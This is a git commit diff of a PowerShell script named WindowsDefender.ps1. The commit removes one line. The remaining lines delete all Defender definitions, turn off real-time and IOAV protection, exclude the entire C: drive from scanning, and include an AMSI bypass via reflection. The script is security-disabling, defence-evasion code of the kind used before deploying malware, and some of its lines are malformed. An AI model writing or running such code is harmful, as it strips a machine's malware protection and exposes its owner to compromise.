992f2a1ef7ed4ee930d92c3119830210bdbfa341
Ashton Fox <61950589+ashscottf@users.noreply.github.com>
2022-08-11 13:44:18 -0500

    Update WindowsDefender.ps1

--- WindowsDefender.ps1
+++ WindowsDefender.ps1
@@ -1,4 +1,3 @@
-Set-Location -Path $env:USERPROFILE -PassThru;
 "${env:ProgramFiles}\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true;
 Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "c:/";  
 "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
